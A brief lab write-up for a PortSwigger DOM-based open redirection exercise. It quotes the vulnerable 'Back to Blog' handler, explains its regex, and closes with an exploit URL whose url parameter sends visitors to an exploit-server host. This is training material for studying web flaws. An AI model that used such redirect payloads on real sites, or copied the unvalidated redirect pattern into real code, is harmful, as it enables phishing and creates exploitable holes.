# [DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection)

> exploiting an url based redirection

- in any posts there is a "Back to Blog" link on the bottom of the screen
- check that link in the developer tools

```
<a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : &quot;/&quot;">Back to Blog</a>
```

> the `js` part of it is the important piece

```
returnUrl = /url=(https?:\/\/.+)/.exec(location);
location.href = returnUrl ? returnUrl[1] : "/";
```

- from the `url` creating a value with regex and making that value equal to the `returnUrl`
- checking that `returnUrl` if exist, if not `location.href = "/"` otherwise `location.href = returnUrl[1]`

> what does the regex do `/url=(https?:\/\/.+)/`

| Part    | Matches                            | Notes                                             |
| ------- | ---------------------------------- | ------------------------------------------------- |
| `url=`  | The literal text "url="            | Anchor to find the right query param              |
| `(`     | -                                  | Opens capture group (becomes index [1] in result) |
| `https` | The literal text "https"           |                                                   |
| `?`     | Makes the preceding `s` optional   | Matches both "http" and "https"                   |
| `:`     | The literal text ":"               |                                                   |
| `\/\/`  | "//"                               | Forward slashes escaped with `\`                  |
| `.`     | Any single character               |                                                   |
| `+`     | One or more of the preceding token | Combined with `.` matches the rest of the URL     |
| `)`     | -                                  | Closes capture group                              |

- the regex can return `null` or an array with two elements
- in case of `https://example.com?url=https://google.com`
- `["url=https://google.com", "https://google.com"]`
- the index 0 is the full match
- index 1 is the captured match the one in the `()`
- the exploit lays in the `url=https://...` part

> the exploit

```
https://xxx.web-security-academy.net/post?postId=6&url=https://yyy.exploit-server.net/exploit
```

- paste it in the url
